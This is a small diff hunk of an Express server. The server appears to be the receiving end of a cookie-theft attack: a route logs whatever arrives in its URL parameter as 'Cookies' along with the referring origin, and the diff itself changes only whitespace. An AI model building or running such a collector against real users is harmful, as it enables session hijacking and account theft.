@@ -12,7 +12,7 @@ app.get('/:data', (req, res)=>{
     const {data} = req.params;    
     console.log("Cookies: ", data);
     if(req.headers.referer) console.log("Origin: ", req.headers.referer);
-    return res.status(200).send("");
+    return res.status(200).send("");  
 })
 
 app.listen(PORT, ()=>{
